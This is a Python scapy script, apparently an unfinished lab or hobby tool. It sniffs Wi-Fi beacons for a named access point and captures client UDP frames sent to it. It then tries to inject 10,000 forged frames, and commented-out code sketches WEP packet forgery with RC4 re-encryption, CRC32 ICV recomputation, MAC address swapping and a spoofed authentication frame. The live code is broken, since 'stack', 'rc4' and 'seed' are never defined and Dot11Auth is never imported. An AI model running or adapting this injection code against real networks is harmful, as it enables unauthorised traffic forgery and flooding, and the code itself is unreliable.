from scapy.all import RadioTap, LLC, Dot11FCS, Dot11QoS, Dot11Beacon, Dot11WEP, sniff, Dot11, ls, UDP, IP, send, sendp, sr, srp, FlagsField
import binascii
import sys
import zlib
from binascii import hexlify
if len(sys.argv) < 3:
    print('Usage: python3 sniff_decypher.py [AP_NAME] [Sniff count]')
    exit(1)

'''
First step: start sniffing the beacon
and find information about it
'''

AP_NAME = bytes(sys.argv[1], encoding='utf-8')
beacons = []

def sniff_beacons(pkt):
    global beacons
    if Dot11Beacon in pkt:
        try:
            if pkt.info == AP_NAME:
                beacons.append(pkt)
        except Exception as e:
            print(e)

sniff(count=150, iface="wlan0mon", prn=sniff_beacons)
AP_INFO = {
    'name': AP_NAME,
    'mac': beacons[0].addr2,
    'full_beacon': beacons[0]
}

'''
Capture a frame
'''
client_data = []
def sniff_client(pkt):
    global AP_INFO
    if Dot11QoS in pkt:
        if pkt.addr1 == AP_INFO['mac'] and UDP in pkt:
            client_data.append(pkt)

sniff(count=int(sys.argv[2]), iface='wlan0mon', prn=sniff_client)

for cd in client_data:
    dport = cd[UDP].dport
    sport = cd[UDP].sport
    version = cd[IP].version
    ihl = cd[IP].ihl
    tos = cd[IP].tos
    id = cd[IP].id
    ttl = cd[IP].ttl
    proto = cd[IP].proto
    src = cd[IP].src
    dst = cd[IP].dst



    sendp(stack, count=10000, inter=.1)
    exit(1)

# packet = Dot11(addr1=[RECEIVER MAC], addr2=[SENDER MAC], addr3=[BSSID]) / Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)

# if info[1] == 'ff:ff:ff:ff:ff:ff':
#     del info[1]
# if info[1] == info[2]:
#     del info[2]

# packets = sniff(count=int(sys.argv[3]), iface="wlan0mon", prn=target_listening)
# print(len(packets))
# for pkt in packets:
#     print(pkt.summary())
    # stack = LLC()/IP(src='192.168.1.1', dst='192.168.1.129')/UDP(sport=44444, dport=37020, len=len(msg))/msg
    # cyphered = rc4(bytes(stack), seed)
    # pkt[Dot11WEP].wepdata = cyphered
    # pkt[Dot11WEP].icv = zlib.crc32(bytes(stack))
    # pkt.addr1 = pkt.addr2
    # pkt.addr2 = pkt.addr3
    # sendp(pkt, iface='wlan0mon')


